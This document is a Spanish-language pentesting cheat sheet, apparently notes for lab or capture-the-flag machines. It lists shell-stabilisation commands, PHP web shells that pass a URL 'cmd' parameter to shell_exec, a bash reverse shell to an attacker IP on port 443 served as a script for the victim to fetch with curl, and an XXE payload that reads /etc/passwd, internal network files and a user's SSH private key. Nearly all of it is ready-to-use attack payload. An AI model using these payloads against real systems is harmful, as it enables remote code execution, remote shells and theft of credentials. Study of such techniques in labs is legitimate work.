# Diferentes codigos ❮❯

## Tratamiento de la pseudo-consola
```bash
❯ python3 -c ‘import pty;pty.spawn(“/bin/bash”)’         # Para remplazar el comando de 'Script' por si no lo acepta la consola

❯ Script /dev/null -c bash
❯ Ctrl + z
❯ stty raw -echo; fg
❯ reset xterm

# Despues cambiamos esto para poder hacer Ctrl+ l y Ctrl + c
❯ echo $SHELL                                            # Para ver la ruta de shell y ver que valor tiene **/usr/bin/nologin**
❯ export SHELL=bash o ❯ export SHELL=/bin/bash           # Hacemos que shell ahora valga bash
❯ export TERM=xterm                                      # Para poder hacer Ctrl +c y Ctrl + l (l=ele)

# Ahora para modificar las dimensiones de Vim/nano debemos hacer lo siguiente.
❯ stty size                                              # Miramos las dimensiones de la consola
❯ stty rows 51 columns 189                               # Modificamos las dimensiones de la consola Vim/Nano
```

## PHP
Con este codigo le decimos a la pagina que queremos que cuando se ejecute comandos cmd los guarde en la variable, esto si estamos en un Framework

* **Code**
function onStart() {
	$this->page["myVar"] = shell_exec(\$\_GET['cmd']);
}

Y para hacerlo funcionar debemos de hacer lo siguiente en:
* **Markup**
{{this.page.myVar}}
Que eso es lo que va a recibir del condigo anterior

Para poder ejecutar comandos en la URL debemos de colocar al final lo siguinete **?cmd=whoami**

****
Permite ejecutar un comando a nivel de sistema en la web y poder poner **?cmd=whoami**

❯ **nano cmd.php**
❮?php 
		echo "❮prep❯" . shell_exec(\$\_GET\['cmd']) . "❮/prep❯";
?❯


## Bash ReverShell
Este comando siempre se ejecuta en la maquina victima para hacer una ReverShell desde una URL
❯ **bash -c 'bash -i >& /dev/tcp/❮IP❯/❮PORT❯ 0>&1'** 
* Para hacer una ReverShell
* IP -> Direccion de la maquina de atacante
* PORT -> Puerto del netcat mas comun 443

****
Hacemos un archivo index.html y al momento de recibir la peticion **Curl** de la maquina victima podremos ejecutar la revershell y este debe ser interpretado por bash
❯ **nano index.html**
	**#!/bin/bash**
	**bash -i >& /dev/tcp/10.10.14.2/443 0>&1**


## XXE
Procedemos a crear un archivo asi:
❯ **vi file.xml** 
	❮?xml version=”1.0” encoding=”ISO-8859-1”?❯
		❮!DOCTYPE foo \[
		❮!ELEMENT foo ANY❯
	❮!ENTITY xxe SYSTEM “file:////opt/blog/server.js”❯]❯
	❮post❯
		❮title❯This is a test❮/title❯
		❮description❯Mensaje de prueba❮/description❯
		❮markdown❯&xxe;❮/markdown❯
	❮/post❯

Comandos que podemos meter en SYSTEM: 
**\file:///proc/net/fib_trie** Que nos muestra las direcciones IP que se encuetran ahi en la maquina 
**\file:///proc/net/tcp** Que nos muestra los puerto abiertos pero de manera interna, miramos que vienen en fomato hexadecimal y podemos desconvertirlos en alguna pagina web.
**\file:////etc/passwd** Ver los usuarios de la maquina 
**\file:///home/admin/.ssh/id_rsa** Tratar de listar la id_rsa de la maquina

## 
